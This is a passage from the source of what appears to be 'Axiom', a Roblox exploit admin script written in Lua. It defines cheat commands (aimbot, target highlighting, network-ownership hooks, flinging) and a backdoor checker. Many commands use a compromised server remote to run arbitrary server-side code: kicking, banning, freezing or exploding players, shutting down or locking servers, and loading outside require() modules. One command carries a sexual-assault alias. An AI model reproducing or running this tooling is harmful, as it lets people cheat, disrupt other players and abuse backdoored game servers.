			Aliases = {"whois", "profile"},
			Description = "Show account info (age, followers, etc).",
			Usage = "whois <player>",
			Arguments = {"player"},
			Run = function(args)
				local target = getPlr(args[1])
				for i, v in pairs(target) do
					if #target == 0 then return end
					
					local output = string.format(
						"[%s]\nUser ID: %d\nAccount Age: %d days\n",
						v.Name,
						v.UserId,
						math.floor((tick() - v.AccountAge) / 86400)
					)
					
					notice(output)
				end
			end
		},

		{
			Name = "FullBright",
			Aliases = {"fullbright", "bright"},
			Description = "Remove shadows and darkness.",
			Usage = "fullbright",
			Arguments = {},
			Run = function(args)
				local lighting = game:GetService("Lighting")
				lighting.Brightness = 3
				lighting.Ambient = Color3.fromRGB(255, 255, 255)
				lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)
				
				for _, obj in pairs(lighting:GetChildren()) do
					if obj:IsA("Light") then
						obj.Brightness = 3
					end
				end
				
			end
		},

		{
			Name = "AimBot",
			Aliases = {"aimbot", "aim"},
			Description = "Lock camera to nearest player's head.",
			Usage = "aimbot",
			Arguments = {},
			Run = function(args)
				if _G.AimbotActive then
					_G.AimbotActive = false
					return
				end

				_G.AimbotActive = true
				local camera = workspace.CurrentCamera
				
				game:GetService("RunService").RenderStepped:Connect(function()
					if not _G.AimbotActive then return end
					
					local closestPlayer = nil
					local closestDistance = math.huge
					local myChar = game.Players.LocalPlayer.Character
					if not myChar then return end
					local myRoot = myChar:FindFirstChild("HumanoidRootPart")
					if not myRoot then return end
					
					for _, player in pairs(game.Players:GetPlayers()) do
						if player ~= game.Players.LocalPlayer then
							local char = player.Character
							if char then
								local head = char:FindFirstChild("Head")
								if head then
									local dist = (myRoot.Position - head.Position).Magnitude
									if dist < closestDistance then
										closestDistance = dist
										closestPlayer = player
									end
								end
							end
						end
					end
					
					if closestPlayer and closestPlayer.Character then
						local head = closestPlayer.Character:FindFirstChild("Head")
						if head then
							camera.CFrame = CFrame.new(camera.CFrame.Position, head.Position)
						end
					end
				end)
				
			end
		},

		{
			Name = "Targeting",
			Aliases = {"targeting", "target"},
			Description = "Auto-select and highlight a target.",
			Usage = "targeting <player>",
			Arguments = {"player"},
			Run = function(args)
				local target = getPlr(args[1])
				for i, v in pairs(target) do
					if #target == 0 then return end
					local char = v.Character
					if not char then return end
					
					for _, part in pairs(char:GetDescendants()) do
						if part:IsA("BasePart") then
							if not part:FindFirstChild("TargetHighlight") then
								local hi = Instance.new("Highlight")
								hi.Name = "TargetHighlight"
								hi.DepthMode = "Occluded"
								hi.FillColor = Color3.fromRGB(255, 0, 0)
								hi.FillTransparency = 0.2
								hi.OutlineColor = Color3.fromRGB(255, 0, 0)
								hi.Parent = part
							end
						end
					end
					
				end
			end
		},

		{
			Name = "UnInfo",
			Aliases = {"uninfo"},
			Description = "Disable info display.",
			Usage = "uninfo",
			Arguments = {},
			Run = function(args)
				for _, gui in pairs(game.Players.LocalPlayer:FindFirstChild("PlayerGui"):GetChildren()) do
					if gui.Name:match("^InfoGui_") then
						gui:Destroy()
					end
				end
			end
		},

		{
			Name = "UnChatLog",
			Aliases = {"unchatlog"},
			Description = "Disable chat log.",
			Usage = "unchatlog",
			Arguments = {},
			Run = function(args)
				local playerGui = game.Players.LocalPlayer:FindFirstChild("PlayerGui")
				if playerGui then
					local chatGui = playerGui:FindFirstChild("ChatLogGui")
					if chatGui then chatGui:Destroy() end
				end
			end
		},

		{
			Name = "UnRadar",
			Aliases = {"unradar"},
			Description = "Disable radar.",
			Usage = "unradar",
			Arguments = {},
			Run = function(args)
				local playerGui = game.Players.LocalPlayer:FindFirstChild("PlayerGui")
				if playerGui then
					local radarGui = playerGui:FindFirstChild("RadarGui")
					if radarGui then radarGui:Destroy() end
				end
			end
		},

		{
			Name = "UnHeatmap",
			Aliases = {"unheatmap"},
			Description = "Disable heatmap vision.",
			Usage = "unheatmap",
			Arguments = {},
			Run = function(args)
				for _, player in pairs(game.Players:GetPlayers()) do
					if player.Character then
						for _, part in pairs(player.Character:GetDescendants()) do
							if part:IsA("BasePart") then
								local heat = part:FindFirstChild("HeatHighlight")
								if heat then heat:Destroy() end
							end
						end
					end
				end
			end
		},

		{
			Name = "UnNightVision",
			Aliases = {"unnightvision", "unnv"},
			Description = "Disable night vision.",
			Usage = "unnightvision",
			Arguments = {},
			Run = function(args)
				local lighting = game:GetService("Lighting")
				lighting.Brightness = 2
				lighting.Ambient = Color3.fromRGB(128, 128, 128)
				lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
				
				for _, player in pairs(game.Players:GetPlayers()) do
					if player.Character then
						for _, part in pairs(player.Character:GetDescendants()) do
							if part:IsA("BasePart") then
								part.Material = Enum.Material.Plastic
							end
						end
					end
				end
			end
		},

		{
			Name = "UnESP",
			Aliases = {"unesp"},
			Description = "Disable ESP.",
			Usage = "unesp",
			Arguments = {},
			Run = function(args)
				for _, player in pairs(game.Players:GetPlayers()) do
					if player.Character then
						local root = player.Character:FindFirstChild("HumanoidRootPart")
						if root then
							local billboard = root:FindFirstChild("ESP_" .. player.Name)
							if billboard then billboard:Destroy() end
						end
					end
				end
			end
		},

		{
			Name = "UnHighlight",
			Aliases = {"unhighlight", "unglow"},
			Description = "Remove all highlights.",
			Usage = "unhighlight",
			Arguments = {},
			Run = function(args)
				for _, player in pairs(game.Players:GetPlayers()) do
					if player.Character then
						for _, part in pairs(player.Character:GetDescendants()) do
							if part:IsA("BasePart") then
								local hi = part:FindFirstChild("Highlight")
								if hi then hi:Destroy() end
							end
						end
					end
				end
			end
		},

		{
			Name = "UnNameTag",
			Aliases = {"unnametag", "untag"},
			Description = "Remove all nametags.",
			Usage = "unnametag",
			Arguments = {},
			Run = function(args)
				local playerGui = game.Players.LocalPlayer:FindFirstChild("PlayerGui")
				if playerGui then
					for _, child in pairs(playerGui:GetChildren()) do
						if child:IsA("BillboardGui") then
							child:Destroy()
						end
					end
				end
			end
		},

		{
			Name = "UnTracers",
			Aliases = {"untracers", "unlines"},
			Description = "Disable tracers.",
			Usage = "untracers",
			Arguments = {},
			Run = function(args)
				_G.TracersActive = false
			end
		},

		{
			Name = "UnDistance",
			Aliases = {"undistance", "undist"},
			Description = "Disable distance display.",
			Usage = "undistance",
			Arguments = {},
			Run = function(args)
				local playerGui = game.Players.LocalPlayer:FindFirstChild("PlayerGui")
				if playerGui then
					local distGui = playerGui:FindFirstChild("DistanceGui")
					if distGui then distGui:Destroy() end
				end
			end
		},

		{
			Name = "UnStats",
			Aliases = {"unstats"},
			Description = "Remove all stat displays.",
			Usage = "unstats",
			Arguments = {},
			Run = function(args)
				for _, player in pairs(game.Players:GetPlayers()) do
					if player.Character then
						local root = player.Character:FindFirstChild("HumanoidRootPart")
						if root then
							local billboard = root:FindFirstChild("Stats_" .. player.Name)
							if billboard then billboard:Destroy() end
						end
					end
				end
			end
		},

		{
			Name = "UnFullBright",
			Aliases = {"unfullbright", "unbright"},
			Description = "Reset lighting to normal.",
			Usage = "unfullbright",
			Arguments = {},
			Run = function(args)
				local lighting = game:GetService("Lighting")
				lighting.Brightness = 2
				lighting.Ambient = Color3.fromRGB(128, 128, 128)
				lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
			end
		},

		{
			Name = "UnAimBot",
			Aliases = {"unaimbot", "unaim"},
			Description = "Disable aimbot.",
			Usage = "unaimbot",
			Arguments = {},
			Run = function(args)
				_G.AimbotActive = false
			end
		},

		{
			Name = "UnTargeting",
			Aliases = {"untargeting", "untarget"},
			Description = "Remove all target highlights.",
			Usage = "untargeting",
			Arguments = {},
			Run = function(args)
				for _, player in pairs(game.Players:GetPlayers()) do
					if player.Character then
						for _, part in pairs(player.Character:GetDescendants()) do
							if part:IsA("BasePart") then
								local hi = part:FindFirstChild("TargetHighlight")
								if hi then hi:Destroy() end
							end
						end
					end
				end
			end
		},

		{
			Name = "UnOrbit",
			Aliases = {"unorbit"},
			Description = "Stop orbiting.",
			Usage = "unorbit",
			Arguments = {},
			Run = function(args)
				if _G.OrbitConn then
					_G.OrbitConn:Disconnect()
					_G.OrbitConn = nil
					tempdisableantifling = false
				end
			end
		},

		{
			Name = "UnSoundFinder",
			Aliases = {"unsoundfinder", "unsounds"},
			Description = "Disable sound finder.",
			Usage = "unsoundfinder",
			Arguments = {},
			Run = function(args)
				_G.SoundFinderActive = false
			end
		},
		{
			Name = "NetworkOwnerShip",
			Aliases = {"networkownership"},
			Description = "Transfer network ownership of all nearby parts to you.",
			Usage = "networkownership",
			Arguments = {},
			Run = function(args)
				networkownershipall = true
				local maxSim = 1000
				getgenv().setsimulationradius = newcclosure(function(i,v)
					local plr = game.Players.LocalPlayer
					sethiddenproperty(plr,"MaxSimulationRadius",maxSim)    
					sethiddenproperty(plr,"SimulationRadius",maxSim)
				end)
				local sethidden
				sethidden = hookfunction(getgenv().sethiddenproperty,function(i,p,v)
					if i == plr then
						if (p == "MaxSimulationRadius" or p == "SimulationRadius") then
							if v == maxSim then
								sethidden(i,p,v)
							end 
						else 
							sethidden(i,p,v) 
						end 
					else
						sethidden(i,p,v) 
					end
				end)
			end
		},
		{
			Name = "SlingShot",
			Aliases = {"slingshot"},
			Description = "Weld Flings a target forward at high speed.",
			Usage = "slingshot <player>",
			Arguments = {"player"},
			Run = function(args)
				local targets = getPlr(args[1])
				WeldFling(targets, CFrame.new(0, -3, 0), CFrame.Angles(math.rad(45), 0, 0), Vector3.new(1000, 400, 0), true)
			end
		},
		{
			Name = "Fire",
			Aliases = {"fire"},
			Description = "Makes someone catch fire CLIENT SIDED.",
			Usage = "fire <player>",
			Arguments = {"player"},
			Run = function(args)
				local targets = getPlr(args[1])
				for i,v in pairs(targets)do
					if #targets == 0 then return end
					if v.Character.HumanoidRootPart then
						local fire = Instance.new("Fire", v.Character.HumanoidRootPart)
					end
				end
			end
		},
		{
			Name = "Smoke",
			Aliases = {"smoke"},
			Description = "Makes someone start smoking CLIENT SIDED.",
			Usage = "smoke <player>",
			Arguments = {"player"},
			Run = function(args)
				local targets = getPlr(args[1])
				for i,v in pairs(targets)do
					if #targets == 0 then return end
					if v.Character.HumanoidRootPart then
						local smoke = Instance.new("Smoke", v.Character.HumanoidRootPart)
					end
				end
			end
		},
		{
			Name = "Sparkle",
			Aliases = {"sparkle"},
			Description = "Makes someone sparkle CLIENT SIDED.",
			Usage = "sparkle <player>",
			Arguments = {"player"},
			Run = function(args)
				local targets = getPlr(args[1])
				for i,v in pairs(targets)do
					if #targets == 0 then return end
					if v.Character.HumanoidRootPart then
						local sparkle = Instance.new("Sparkles", v.Character.HumanoidRootPart)
					end
				end
			end
		},
		{
			Name = "UnFire",
			Aliases = {"unfire"},
			Description = "Removes client sided fire on someone.",
			Usage = "unfire <player>",
			Arguments = {"player"},
			Run = function(args)
				local targets = getPlr(args[1])
				for i,v in pairs(targets)do
					if #targets == 0 then return end
					if v.Character.HumanoidRootPart then
						v.Character.HumanoidRootPart:FindFirstChildOfClass("Fire"):Destroy()
					end
				end
			end
		},
		{
			Name = "UnSmoke",
			Aliases = {"unsmoke"},
			Description = "Removes client sided smoke on someone.",
			Usage = "unsmoke <player>",
			Arguments = {"player"},
			Run = function(args)
				local targets = getPlr(args[1])
				for i,v in pairs(targets)do
					if #targets == 0 then return end
					if v.Character.HumanoidRootPart then
						v.Character.HumanoidRootPart:FindFirstChildOfClass("Smoke"):Destroy()
					end
				end
			end
		},
		{
			Name = "UnSparkle",
			Aliases = {"unsparkle"},
			Description = "Removes client sided sparkles on someone.",
			Usage = "unsparkle <player>",
			Arguments = {"player"},
			Run = function(args)
				local targets = getPlr(args[1])
				for i,v in pairs(targets)do
					if #targets == 0 then return end
					if v.Character.HumanoidRootPart then
						v.Character.HumanoidRootPart:FindFirstChildOfClass("Sparkles"):Destroy()
					end
				end
			end
		},
		{
			Name = "AxiomSSCheck",
			Aliases = {"axiomsscheck"},
			Description = "Uses a slow but accurate backdoor check system.",
			Usage = "axiomsscheck",
			Arguments = {},
			Run = function(args)
				if MultiBackdoorChecker() then
					notice("Backdoor was found: "..backdoor.Parent.Name.."/"..backdoor.Name..".")
				else
					notice("No hidden backdoors found try a different game.")
				end
			end
		},
		{
			Name = "Kick",
			Aliases = {"kick"},
			Description = "Uses BACKDOOR remotes to kick users. [MAKE SURE TO RUN AxiomSSCheck FIRST]",
			Usage = "kick",
			Arguments = {"player"},
			Run = function(args)
				if backdoor == nil then 
					notice("You havent ran AxiomSSCheck. Please run it first!")
					return 
				end
				local targets = getPlr(args[1])
				for i,v in pairs(targets)do
					if #targets == 0 then return end
					if v.UserId == plr.UserId then return end
					local targetname = v.Name
					local message = table.concat(args, " ", 2) or "Server Sent Kick Request."
					runRemote(backdoor, "for _, v in pairs(game.Players:GetPlayers()) do if v.Name == '"..targetname.."' then v:Kick('"..tostring(message).."') end end")
				end
			end
		},
		{
			Name = "Ban",
			Aliases = {"ban"},
			Description = "Uses BACKDOOR remotes to ban users. [MAKE SURE TO RUN AxiomSSCheck FIRST]",
			Usage = "ban <player>",
			Arguments = {"player"},
			Run = function(args)
				if backdoor == nil then 
					notice("You havent ran AxiomSSCheck. Please run it first!")
					return 
				end
				local targets = getPlr(args[1])
				for i,v in pairs(targets)do
					if #targets == 0 then return end
					if v.UserId == plr.UserId then return end
					BanUser(v.UserId)
					local targetname = v.Name
					runRemote(backdoor, "for _, v in pairs(game.Players:GetPlayers()) do if v.Name == '"..targetname.."' then v:Kick('Server Sent Ban Request.') end end")
				end
			end
		},
		{
			Name = "Admin",
			Aliases = {"admin"},
			Description = "Gives a user full chat admin control from Axiom.",
			Usage = "admin <player>",
			Arguments = {"player"},
			Run = function(args)
				local targets = getPlr(args[1])
				for i,v in pairs(targets)do
					if #targets == 0 then return end
					AdminUser(v.UserId)
					local targetname = v.Name
					privatechat(v, "AXIOM | Your prefix is !")
					notice("Gave "..targetname.." Full Chat Admin Control")
				end
			end
		},
		{
			Name = "UnAdmin",
			Aliases = {"unadmin"},
			Description = "Removes a user full chat admin control from Axiom.",
			Usage = "unadmin <player>",
			Arguments = {"player"},
			Run = function(args)
				local targets = getPlr(args[1])
				for i,v in pairs(targets)do
					if #targets == 0 then return end
					UnAdminUser(v.UserId)
					local targetname = v.Name
					privatechat(v, "AXIOM | Chat Commands Removed")
					notice("Removed "..targetname.."'s Full Chat Admin Control")
				end
			end
		},
		{
			Name = "ServerMessage",
			Aliases = {"servermessage", "sm"},
			Description = "Uses BACKDOOR remotes to send a message to the server. [MAKE SURE TO RUN AxiomSSCheck FIRST]",
			Usage = "servermessage <string>",
			Arguments = {"string"},
			Run = function(args)
				if backdoor == nil then 
					notice("You havent ran AxiomSSCheck. Please run it first!")
					return 
				end
				local message = table.concat(args, " ", 1) or ""
				if message == nil or message == "" then return end
				runRemote(backdoor, "local message = Instance.new('Message') message.Text = '"..message.."' message.Parent = workspace task.wait(5) message:Destroy()")
			end
		},
		{
			Name = "Shutdown",
			Aliases = {"shutdown"},
			Description = "Uses BACKDOOR remotes to shutdown the server. [MAKE SURE TO RUN AxiomSSCheck FIRST]",
			Usage = "shutdown <string>",
			Arguments = {"string"},
			Run = function(args)
				if backdoor == nil then 
					notice("You havent ran AxiomSSCheck. Please run it first!")
					return 
				end
				local message = table.concat(args, " ", 1) or "Server Requested Shutdown."
				runRemote(backdoor, "for _, v in pairs(game.Players:GetPlayers()) do if v.Name ~= '"..plr.Name.."' then v:Kick('"..tostring(message).."') end end wait() for _, v in pairs(game.Players:GetPlayers()) do if v.Name == '"..plr.Name.."' then v:Kick("..tostring(message)..") end end")
			end
		},
		{
			Name = "ServerLock",
			Aliases = {"serverlock", "slock"},
			Description = "Uses BACKDOOR remotes to lockdown the server. [MAKE SURE TO RUN AxiomSSCheck FIRST]",
			Usage = "serverlock",
			Arguments = {},
			Run = function(args)
				if backdoor == nil then 
					notice("You havent ran AxiomSSCheck. Please run it first!")
					return 
				end
				slock = true
			end
		},
		{
			Name = "UnServerLock",
			Aliases = {"unserverlock", "unslock"},
			Description = "Uses BACKDOOR remotes to lockdown the server. [MAKE SURE TO RUN AxiomSSCheck FIRST]",
			Usage = "unserverlock",
			Arguments = {},
			Run = function(args)
				if backdoor == nil then 
					notice("You havent ran AxiomSSCheck. Please run it first!")
					return 
				end
				slock = false
			end
		},
		{
			Name = "Freeze",
			Aliases = {"freeze"},
			Description = "Freezes a player. [MAKE SURE TO RUN AxiomSSCheck FIRST]",
			Usage = "freeze <player>",
			Arguments = {"player"},
			Run = function(args)
				if backdoor == nil then 
					notice("You havent ran AxiomSSCheck. Please run it first!")
					return 
				end
				local targets = getPlr(args[1])
				for i,v in pairs(targets)do
					if #targets == 0 then return end
					local targetname = v.Name
					runRemote(backdoor, "for _, v in pairs(game.Players:GetPlayers()) do if v.Name == '"..targetname.."' then v.Character.HumanoidRootPart.Anchored = true end end")
				end
			end
		},
		{
			Name = "UnFreeze",
			Aliases = {"unfreeze"},
			Description = "UnFreezes a player. [MAKE SURE TO RUN AxiomSSCheck FIRST]",
			Usage = "unfreeze <player>",
			Arguments = {"player"},
			Run = function(args)
				if backdoor == nil then 
					notice("You havent ran AxiomSSCheck. Please run it first!")
					return 
				end
				local targets = getPlr(args[1])
				for i,v in pairs(targets)do
					if #targets == 0 then return end
					local targetname = v.Name
					runRemote(backdoor, "for _, v in pairs(game.Players:GetPlayers()) do if v.Name == '"..targetname.."' then v.Character.HumanoidRootPart.Anchored = false end end")
				end
			end
		},
		{
			Name = "MakeSay",
			Aliases = {"makesay"},
			Description = "Makes a player say something. [MAKE SURE TO RUN AxiomSSCheck FIRST]",
			Usage = "makesay <player> <string>",
			Arguments = {"player", "string"},
			Run = function(args)
				if backdoor == nil then 
					notice("You havent ran AxiomSSCheck. Please run it first!")
					return 
				end
				local targets = getPlr(args[1])
				for i,v in pairs(targets)do
					if #targets == 0 then return end
					local targetname = v.Name
					local message = table.concat(args, " ", 2) or nil
					if message == nil or message == "" then return end
					runRemote(backdoor, "for _, v in pairs(game.Players:GetPlayers()) do if v.Name == '"..targetname.."' then game:GetService('TextChatService'):DisplayBubble(v.Character.Head, '"..message.."') end end")
				end
			end
		},
		{
			Name = "R6",
			Aliases = {"r6"},
			Description = "Makes a player r6. [MAKE SURE TO RUN AxiomSSCheck FIRST]",
			Usage = "r6 <player>",
			Arguments = {"player"},
			Run = function(args)
				if backdoor == nil then 
					notice("You havent ran AxiomSSCheck. Please run it first!")
					return 
				end
				local targets = getPlr(args[1])
				for i,v in pairs(targets)do
					if #targets == 0 then return end
					local targetname = v.Name
					runRemote(backdoor, "for _, v in pairs(game.Players:GetPlayers()) do if v.Name == '"..targetname.."' then local character = v.Character if not character then return end local humanoid = character:FindFirstChildOfClass('Humanoid') if not humanoid then return end local description = Players:GetHumanoidDescriptionFromUserId(v.UserId) local newCharacter = Players:CreateHumanoidModelFromDescription(description, Enum.HumanoidRigType.R6) newCharacter:PivotTo(character:GetPivot()) newCharacter.Name = v.Name v.Character = newCharacter newCharacter.Parent = workspace character:Destroy() end end")
				end
			end
		},
		{
			Name = "R15",
			Aliases = {"r15"},
			Description = "Makes a player r15. [MAKE SURE TO RUN AxiomSSCheck FIRST]",
			Usage = "r15 <player>",
			Arguments = {"player"},
			Run = function(args)
				if backdoor == nil then 
					notice("You havent ran AxiomSSCheck. Please run it first!")
					return 
				end
				local targets = getPlr(args[1])
				for i,v in pairs(targets)do
					if #targets == 0 then return end
					local targetname = v.Name
					runRemote(backdoor, "for _, v in pairs(game.Players:GetPlayers()) do if v.Name == '"..targetname.."' then local character = v.Character if not character then return end local humanoid = character:FindFirstChildOfClass('Humanoid') if not humanoid then return end local description = Players:GetHumanoidDescriptionFromUserId(v.UserId) local newCharacter = Players:CreateHumanoidModelFromDescription(description, Enum.HumanoidRigType.R15) newCharacter:PivotTo(character:GetPivot()) newCharacter.Name = v.Name v.Character = newCharacter newCharacter.Parent = workspace character:Destroy() end end")
				end
			end
		},
		{
			Name = "Explode",
			Aliases = {"explode"},
			Description = "Blows up a player. [MAKE SURE TO RUN AxiomSSCheck FIRST]",
			Usage = "explode <player>",
			Arguments = {"player"},
			Run = function(args)
				if backdoor == nil then 
					notice("You havent ran AxiomSSCheck. Please run it first!")
					return 
				end
				local targets = getPlr(args[1])
				for i,v in pairs(targets)do
					if #targets == 0 then return end
					local targetname = v.Name
					runRemote(backdoor, "for _, v in pairs(game.Players:GetPlayers()) do if v.Name == '"..targetname.."' then local explosion = Instance.new('Explosion') explosion.Position = v.Character.HumanoidRootPart.Position explosion.Parent = workspace end end")
				end
			end
		},
		{
			Name = "Nuke",
			Aliases = {"nuke"},
			Description = "Nukes a player and blows everyone else up [MAKE SURE TO RUN AxiomSSCheck FIRST]",
			Usage = "nuke <player>",
			Arguments = {"player"},
			Run = function(args)
				if backdoor == nil then 
					notice("You havent ran AxiomSSCheck. Please run it first!")
					return 
				end
				local targets = getPlr(args[1])
				for i,v in pairs(targets)do
					if #targets == 0 then return end
					local targetname = v.Name
					runRemote(backdoor, "for _, v in pairs(game.Players:GetPlayers()) do if v.Name == '"..targetname.."' then local torso = v.Character.HumanoidRootPart local nuke = Instance.new('Part', game.Workspace) local opos = torso.CFrame nuke.BrickColor = BrickColor.new('Bright yellow') nuke.TopSurface = Enum.SurfaceType.Smooth nuke.BottomSurface = Enum.SurfaceType.Smooth nuke.Anchored = true nuke.CanCollide = false nuke.Shape = 'Ball' nuke.Transparency = 0.5 nuke.CFrame = torso.CFrame nuke.Size = Vector3.new(1, 1, 1)  nuke.Touched:connect(function(p) local expl = Instance.new('Explosion', p) expl.BlastPressure = 50000 expl.BlastRadius = 50 expl.Position = p.Position p.Material = Enum.Material.CorrodedMetal p:BreakJoints() end) for i = 1, 150 do nuke.Size = Vector3.new(i, i, i) nuke.CFrame = opos wait(0.08) end nuke:Destroy() end end")
				end
			end
		},
		{
			Name = "DogeArmy",
			Aliases = {"dogearmy"},
			Description = "Gives a player a doge army. [MAKE SURE TO RUN AxiomSSCheck FIRST]",
			Usage = "dogearmy <player>",
			Arguments = {"player"},
			Run = function(args)
				if backdoor == nil then 
					notice("You havent ran AxiomSSCheck. Please run it first!")
					return 
				end
				local targets = getPlr(args[1])
				for i,v in pairs(targets)do
					if #targets == 0 then return end
					local targetname = v.Name
					runRemote(backdoor, "require(5115249013).fehack('"..targetname.."')")
				end
			end
		},
		{
			Name = "GrabKnifeV1",
			Aliases = {"grabknifev1"},
			Description = "Gives a player grabknifev1. [MAKE SURE TO RUN AxiomSSCheck FIRST]",
			Usage = "grabknifev1 <player>",
			Arguments = {"player"},
			Run = function(args)
				if backdoor == nil then 
					notice("You havent ran AxiomSSCheck. Please run it first!")
					return 
				end
				local targets = getPlr(args[1])
				for i,v in pairs(targets)do
					if #targets == 0 then return end
					local targetname = v.Name
					runRemote(backdoor, "require(14638461547).GKV1('"..targetname.."')")
				end
			end
		},
		{
			Name = "GrabKnifeV2",
			Aliases = {"grabknifev2"},
			Description = "Gives a player grabknifev2. [MAKE SURE TO RUN AxiomSSCheck FIRST]",
			Usage = "grabknifev2 <player>",
			Arguments = {"player"},
			Run = function(args)
				if backdoor == nil then 
					notice("You havent ran AxiomSSCheck. Please run it first!")
					return 
				end
				local targets = getPlr(args[1])
				for i,v in pairs(targets)do
					if #targets == 0 then return end
					local targetname = v.Name
					runRemote(backdoor, "require(16662799266):Fire('"..targetname.."','knife')")
				end
			end
		},
		{
			Name = "GrabKnifeV3",
			Aliases = {"grabknifev3"},
			Description = "Gives a player grabknifev3. [MAKE SURE TO RUN AxiomSSCheck FIRST]",
			Usage = "grabknifev3 <player>",
			Arguments = {"player"},
			Run = function(args)
				if backdoor == nil then 
					notice("You havent ran AxiomSSCheck. Please run it first!")
					return 
				end
				local targets = getPlr(args[1])
				for i,v in pairs(targets)do
					if #targets == 0 then return end
					local targetname = v.Name
					runRemote(backdoor, "require(2829943043):Run('"..targetname.."','i baked you a pie')")
				end
			end
		},
		{
			Name = "GrabKnifeV4",
			Aliases = {"grabknifev4"},
			Description = "Gives a player grabknifev4. [MAKE SURE TO RUN AxiomSSCheck FIRST]",
			Usage = "grabknifev4 <player>",
			Arguments = {"player"},
			Run = function(args)
				if backdoor == nil then 
					notice("You havent ran AxiomSSCheck. Please run it first!")
					return 
				end
				local targets = getPlr(args[1])
				for i,v in pairs(targets)do
					if #targets == 0 then return end
					local targetname = v.Name
					runRemote(backdoor, "require(5023577572):Fire('"..targetname.."')")
				end
			end
		},
		{
			Name = "Execute",
			Aliases = {"execute", "require"},
			Description = "Uses BACKDOOR remotes to execute SERVER SIDE scripts. [MAKE SURE TO RUN AxiomSSCheck FIRST]",
			Usage = "execute <string>",
			Arguments = {"string"},
			Run = function(args)
				if backdoor == nil then 
					notice("You havent ran AxiomSSCheck. Please run it first!")
					return 
				end
				local message = table.concat(args, " ", 1) or "print('hello world')"
				runRemote(backdoor, tostring(message))
			end
		},
		{
			Name = "LoadString",
			Aliases = {"loadstring", "executescript"},
			Description = "Uses Loadstring to run CLIENT SIDED scripts.",
			Usage = "loadstring <string>",
			Arguments = {"string"},
			Run = function(args)
				local message = table.concat(args, " ", 1) or "print('hello world')"
				loadstring(tostring(message))
			end
		},
		{
			Name = "RejectCharacterDeletionsCheck",
			Aliases = {"rejectcharacterdeletionscheck", "rcdcheck"},
			Description = "Checks to see if Workspace.RejectCharacterDeletions is enabled or disabled.",
			Usage = "rejectcharacterdeletionscheck",
			Arguments = {},
			Run = function(args)
				notice("Doing A Quick RCD Check.")
				local isquickcheckRCDEnabled = CheckRCD()
				notice("Axiom RCD check returned: "..tostring(isquickcheckRCDEnabled)..". If true: attach commands wont work. If false: attach commands will work")
			end
		},
		{
			Name = "FEConsoleErrors",
			Aliases = {"feconsoleerrors", "consoleerrors"},
			Description = "Request the server a false animation for a certain amount of time.",
			Usage = "feconsoleerrors <value>",
			Arguments = {"value"},
			Run = function(args)
				local Character = getChar()
				local Humanoid = Character:WaitForChild("Humanoid")
				local Animator = Humanoid:WaitForChild("Animator")
				local amountoftime = tonumber(args[1]) or 100
				local lagamount = 10*amountoftime
				workspace.StreamingEnabled = false
				for i = 1, amountoftime do
					local IDSTRING = "rbxassetid://"..math.random(0,lagamount)
					local reqAnim = Instance.new("Animation")
					reqAnim.AnimationId = IDSTRING
					game:GetService("ContentProvider"):PreloadAsync({reqAnim})
					local BlankAnim = Instance.new("Animation")
					BlankAnim.AnimationId = IDSTRING
					local BlankTrack = Animator:LoadAnimation(BlankAnim):Play(nil, 1, 1)
					local BlankTrack2 = Animator:LoadAnimation(reqAnim):Play(nil, 1, 1)
					
					local animation = Instance.new("Animation")
					if Humanoid.RigType == Enum.HumanoidRigType.R6 then
						animation.AnimationId = "rbxassetid://182393478"
					else
						animation.AnimationId = "rbxassetid://507768375"
					end
					local track = Humanoid:LoadAnimation(animation)
					task.wait(0.5)
					local randomid = math.random(0,359823745893247589)
					animation.AnimationId = "active://"..randomid
					track:Play()
					task.wait(0.5)
					randomid = math.random(0,359823745893247589)
					animation.AnimationId = "rbxasset://"..randomid
					track:Play()
					task.wait(0.5)
					randomid = math.random(0,359823745893247589)
					animation.AnimationId = "rbxgameasset://"..randomid
					track:Play()
					task.wait(0.5)
					randomid = math.random(0,359823745893247589)
					animation.AnimationId = "rbxthumb://"..randomid
					track:Play()
					task.wait(0.5)
					randomid = math.random(0,359823745893247589)
					animation.AnimationId = "rbxhttp://"..randomid
					track:Play()
					task.wait(0.5)
					randomid = math.random(0,359823745893247589)
					animation.AnimationId = "rbxpkg://"..randomid
					track:Play()
					task.wait(0.5)
					randomid = math.random(0,359823745893247589)
					animation.AnimationId = "rbxavatar://"..randomid
					track:Play()
					
					game:GetService("RunService").PreRender:Wait()
					local Animate = Character:FindFirstChild("Animate")
					if Animate then
						Animate.Disabled = true
						game:GetService("RunService").PreRender:Wait()
						Animate.Disabled = false
						Humanoid:ChangeState(Enum.HumanoidStateType.Landed)
					end
				end

			end
		},
		{
			Name = "OofSpam",
			Aliases = {"oofspam", "oofs"},
			Description = "Kills your character and spams oof!",
			Usage = "oofspam",
			Arguments = {},
			Run = function(args)
				local speed = tonumber(args[1]) or 5
				local cf, p = CFrame.new(), getChar():FindFirstChild("HumanoidRootPart") or getChar():FindFirstChild("Head")
				local character = getChar()
				if p then
					cf = p.CFrame
				end
				respawn()
				repeat
					local humanoid = character:FindFirstChild("Humanoid")
					if humanoid then
						character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, -100, 0)
						humanoid:ChangeState(Enum.HumanoidStateType.FallingDown)
						humanoid:ChangeState(Enum.HumanoidStateType.Ragdoll)
						humanoid:ChangeState(Enum.HumanoidStateType.Physics)
						humanoid:ChangeState(Enum.HumanoidStateType.StrafingNoPhysics)
						humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
						humanoid:ChangeState(Enum.HumanoidStateType.Freefall)
						humanoid:ChangeState(Enum.HumanoidStateType.Landed)
						workspace.CurrentCamera.CameraSubject = character.HumanoidRootPart
					end
					game:GetService("RunService").PreRender:Wait()
				until getChar() ~= character
				plr.CharacterAdded:Wait(); 
				getChar():WaitForChild("HumanoidRootPart").AssemblyLinearVelocity = Vector3.zero
				getChar():WaitForChild("HumanoidRootPart").AssemblyAngularVelocity = Vector3.zero
				getChar():WaitForChild("HumanoidRootPart").CFrame = cf
			end
		},
		{
			Name = "Bang2",
			Aliases = {"bang2", "rape"},
			Description = "Its bang but with no animations so its r6 and r15.",
			Usage = "bang2 <player>",
			Arguments = {"player"},
			Run = function(args)
				local targets = getPlr(args[1])
				if #targets == 0 then return end
				local hum = getChar().Humanoid
				local target = targets[1]
				local targetChar = target.Character
				if bang2 == true then 
					bang2 = false
				end
				task.wait()
				bang2 = true
				hum.PlatformStand = true
				local alivecheck1 = true
				local alivecheck2 = true
				repeat
